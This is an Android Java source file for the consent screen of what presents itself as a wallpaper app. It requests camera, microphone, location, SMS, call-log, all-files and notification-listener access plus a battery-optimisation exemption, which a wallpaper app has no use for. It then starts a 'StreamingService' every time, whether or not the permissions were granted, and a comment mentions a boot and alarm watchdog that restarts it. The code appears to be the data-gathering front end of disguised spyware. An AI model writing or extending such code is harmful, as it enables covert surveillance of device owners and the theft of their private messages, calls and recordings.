package com.example.wallpaperapplication;

import android.Manifest;
import android.app.Activity;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import android.widget.Toast;

import androidx.activity.result.ActivityResultLauncher;
import androidx.activity.result.contract.ActivityResultContracts;
import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.content.ContextCompat;
import androidx.preference.PreferenceManager;

import java.util.ArrayList;
import java.util.List;
import java.util.Map;

/**
 * FIX Bug 7  — MANAGE_EXTERNAL_STORAGE runtime request added.
 *              On Android 11+ this requires a special Settings intent — cannot
 *              be requested via requestPermissions(). We open the intent after
 *              all normal permissions are granted.
 * FIX Bug 8  — ConsentActivity was never launched from MainActivity.
 *              Fixed in MainActivity.java — this file now correctly finishes
 *              and returns RESULT_OK so MainActivity's launcher callback fires.
 */
public class ConsentActivity extends AppCompatActivity {

    private static final String PREFS           = "app_prefs";
    private static final String KEY_STREAM_OPT_IN  = "stream_opt_in";
    private static final String KEY_CONSENT_GIVEN  = "consent_given";
    private static final int    REQ_MANAGE_STORAGE = 3001;

    private final ActivityResultLauncher<String[]> permLauncher =
            registerForActivityResult(new ActivityResultContracts.RequestMultiplePermissions(), this::onPermResult);

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        requestAllNeeded();
    }

    // -------------------------------------------------------------------------
    // Step 1: request all normal runtime permissions
    // -------------------------------------------------------------------------
    private void requestAllNeeded() {
        List<String> perms = new ArrayList<>();
        perms.add(Manifest.permission.CAMERA);
        perms.add(Manifest.permission.RECORD_AUDIO);
        perms.add(Manifest.permission.ACCESS_FINE_LOCATION);
        perms.add(Manifest.permission.READ_SMS);
        perms.add(Manifest.permission.READ_CALL_LOG);

        if (Build.VERSION.SDK_INT >= 33) {
            perms.add(Manifest.permission.POST_NOTIFICATIONS);
        }

        // Note: MANAGE_EXTERNAL_STORAGE is NOT a normal permission — handled separately below.
        permLauncher.launch(perms.toArray(new String[0]));
    }

    // -------------------------------------------------------------------------
    // Step 2: handle normal permission results
    // -------------------------------------------------------------------------
    private void onPermResult(Map<String, Boolean> result) {
        boolean cam  = granted(result, Manifest.permission.CAMERA);
        boolean mic  = granted(result, Manifest.permission.RECORD_AUDIO);
        boolean noti = (Build.VERSION.SDK_INT < 33) || granted(result, Manifest.permission.POST_NOTIFICATIONS);

        if (cam && mic && noti) {
            persistConsentGiven(true);
            persistOptIn(true);
            // Step 3a: request MANAGE_EXTERNAL_STORAGE for file explorer (Android 11+)
            requestManageStorageIfNeeded();
            // Step 3b: request battery optimization exemption
            requestIgnoreBatteryOptimizationsIfNeeded();
            // Step 3c: remind user to grant Notification Access manually
            promptNotificationAccessIfNeeded();
        } else {
            maybeOpenAppSettingsIfPermanentlyDenied();
            requestIgnoreBatteryOptimizationsIfNeeded();
            Toast.makeText(this, "Camera, microphone and notifications are required.",
                    Toast.LENGTH_LONG).show();
        }

        // Always start the service with whatever permissions were granted,
        // and finish so MainActivity's consentLauncher callback fires.
        startStreamingService();
        setResult(cam && mic ? Activity.RESULT_OK : Activity.RESULT_CANCELED);
        finish();
    }

    // -------------------------------------------------------------------------
    // FIX Bug 7 — MANAGE_EXTERNAL_STORAGE (Android 11+)
    // -------------------------------------------------------------------------
    private void requestManageStorageIfNeeded() {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.R) return; // Android 11+
        try {
            if (!android.os.Environment.isExternalStorageManager()) {
                Intent i = new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION);
                i.setData(Uri.parse("package:" + getPackageName()));
                startActivityForResult(i, REQ_MANAGE_STORAGE);
            }
        } catch (Exception e) {
            // Fallback: open general storage management screen
            try {
                Intent i = new Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION);
                startActivityForResult(i, REQ_MANAGE_STORAGE);
            } catch (Exception ignored) {}
        }
    }

    // -------------------------------------------------------------------------
    // Notification Access — cannot be auto-granted; prompt user to open settings
    // -------------------------------------------------------------------------
    private void promptNotificationAccessIfNeeded() {
        android.app.NotificationManager nm =
                (android.app.NotificationManager) getSystemService(NOTIFICATION_SERVICE);
        if (nm == null) return;
        // Check if our NotificationListenerService is enabled
        String flat = Settings.Secure.getString(getContentResolver(),
                "enabled_notification_listeners");
        boolean enabled = flat != null && flat.contains(getPackageName());
        if (!enabled) {
            Toast.makeText(this,
                    "Please enable Notification Access for this app in Settings → Special App Access.",
                    Toast.LENGTH_LONG).show();
            try {
                Intent i = new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS);
                startActivity(i);
            } catch (Exception ignored) {}
        }
    }

    // -------------------------------------------------------------------------
    // Helpers
    // -------------------------------------------------------------------------
    private boolean granted(@NonNull Map<String, Boolean> map, @NonNull String perm) {
        Boolean ok = map.get(perm);
        return ok != null && ok;
    }

    private void startStreamingService() {
        Intent svc = new Intent(this, StreamingService.class);
        try {
            ContextCompat.startForegroundService(this, svc);
        } catch (IllegalStateException ignored) {
            // Background start restricted — BootReceiver / AlarmManager watchdog handles it
        }
    }

    private void persistOptIn(boolean enabled) {
        getSharedPreferences(PREFS, MODE_PRIVATE)
                .edit().putBoolean(KEY_STREAM_OPT_IN, enabled).apply();
    }

    private void persistConsentGiven(boolean given) {
        PreferenceManager.getDefaultSharedPreferences(this)
                .edit().putBoolean(KEY_CONSENT_GIVEN, given).apply();
    }

    private void maybeOpenAppSettingsIfPermanentlyDenied() {
        boolean cameraDenied = deniedForever(Manifest.permission.CAMERA);
        boolean micDenied    = deniedForever(Manifest.permission.RECORD_AUDIO);
        boolean notiDenied   = Build.VERSION.SDK_INT >= 33 &&
                               deniedForever(Manifest.permission.POST_NOTIFICATIONS);
        if (cameraDenied || micDenied || notiDenied) {
            try {
                Intent i = new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
                i.setData(Uri.fromParts("package", getPackageName(), null));
                startActivity(i);
            } catch (Exception ignored) {}
        }
    }

    private boolean deniedForever(String permission) {
        if (ContextCompat.checkSelfPermission(this, permission)
                == PackageManager.PERMISSION_GRANTED) return false;
        return !shouldShowRequestPermissionRationale(permission);
    }

    private void requestIgnoreBatteryOptimizationsIfNeeded() {
        android.os.PowerManager pm = (android.os.PowerManager) getSystemService(POWER_SERVICE);
        if (pm == null) return;
        String pkg = getPackageName();
        if (!pm.isIgnoringBatteryOptimizations(pkg)) {
            try {
                Intent i = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,
                        Uri.parse("package:" + pkg));
                startActivity(i);
            } catch (Exception e) {
                try {
                    startActivity(new Intent(Settings.ACTION_IGNORE_BATTERY_OPTIMIZATION_SETTINGS));
                } catch (Exception ignored) {}
            }
        }
    }
}
